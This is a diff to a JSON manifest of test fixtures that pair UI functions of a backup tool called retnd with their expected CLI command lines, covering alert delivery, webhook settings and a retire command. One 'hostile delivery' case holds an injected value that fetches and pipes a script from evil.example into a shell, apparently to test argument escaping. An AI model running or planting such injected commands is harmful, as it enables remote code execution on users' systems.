@@ -7,7 +7,7 @@
     },
     {
       "path": "ui/shared/src/assurance/assuranceCommands.ts",
-      "sha256": "6427846445035d39e5c8569016d86e56151e224bb5b734fad2a6fa2b6a1927c2"
+      "sha256": "d8a89cfbf412f7b67f5289b9cae9615b6e38af7a3d8ad2300531bade480b0afe"
     },
     {
       "path": "ui/shared/src/assurance/validatorCommands.ts",
@@ -23,7 +23,7 @@
     },
     {
       "path": "ui/shared/src/observability/observabilityCommands.ts",
-      "sha256": "c008c1137c5bb01e1a7e1b92e1826761b709a153f823024b3f8572b8e7075108"
+      "sha256": "484f4e110cc4f02fb2531b8ba540458368173070c9847dfa240d3e743c4f90da"
     },
     {
       "path": "ui/shared/src/pages/destinationConfigureCommands.ts",
@@ -39,7 +39,7 @@
     },
     {
       "path": "ui/shared/src/test/cliTwins.test.ts",
-      "sha256": "db540368b6b4ea0d498509ec093a90396a116f6df3d45f919189b2a7a9c7e4cf"
+      "sha256": "e8b761cce9b3b45c2baefaff69fc52b9150977619ef2e2625e34930abf8ae484"
     }
   ],
   "twins": [
@@ -132,6 +132,12 @@
       "fn": "retryCommand",
       "case": "one backup",
       "line": "retnd retry api-server/var-backups/dump-2026-10-01.tar.gz"
+    },
+    {
+      "module": "assurance/assuranceCommands",
+      "fn": "retireCommand",
+      "case": "one backup",
+      "line": "retnd retire api-server/var-backups/dump-2026-10-01.tar.gz"
     },
     {
       "module": "assurance/assuranceCommands",
@@ -774,6 +780,72 @@
       "fn": "logsLevelCommand",
       "case": "the error floor",
       "line": "retnd settings observability patch --logs-level error"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "alertsDeliveryCommand",
+      "case": "the platform notifier",
+      "line": "retnd settings observability patch --alerts-delivery platform"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "alertsDeliveryCommand",
+      "case": "a webhook",
+      "line": "retnd settings observability patch --alerts-delivery webhook"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "alertsDeliveryCommand",
+      "case": "a hostile delivery",
+      "line": "retnd settings observability patch --alerts-delivery 'x; curl -s evil.example|sh'"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "webhookDialectCommand",
+      "case": "one object per alert",
+      "line": "retnd settings observability patch --webhook-dialect generic"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "webhookDialectCommand",
+      "case": "the Alertmanager array",
+      "line": "retnd settings observability patch --webhook-dialect alertmanager"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "webhookAllowInsecureHttpCommand",
+      "case": "plain http allowed",
+      "line": "retnd settings observability patch --webhook-allow-insecure-http=true"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "webhookAllowInsecureHttpCommand",
+      "case": "plain http refused",
+      "line": "retnd settings observability patch --webhook-allow-insecure-http=false"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "webhookRefreshIntervalCommand",
+      "case": "the default four minutes",
+      "line": "retnd settings observability patch --webhook-refresh-interval 4m"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "webhookRefreshIntervalCommand",
+      "case": "a minute and a half",
+      "line": "retnd settings observability patch --webhook-refresh-interval 1m30s"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "webhookResolveTtlCommand",
+      "case": "the default ten minutes",
+      "line": "retnd settings observability patch --webhook-resolve-ttl 10m"
+    },
+    {
+      "module": "observability/observabilityCommands",
+      "fn": "webhookResolveTtlCommand",
+      "case": "an hour and ten seconds",
+      "line": "retnd settings observability patch --webhook-resolve-ttl 1h10s"
     },
     {
       "module": "pages/destinationConfigureCommands",
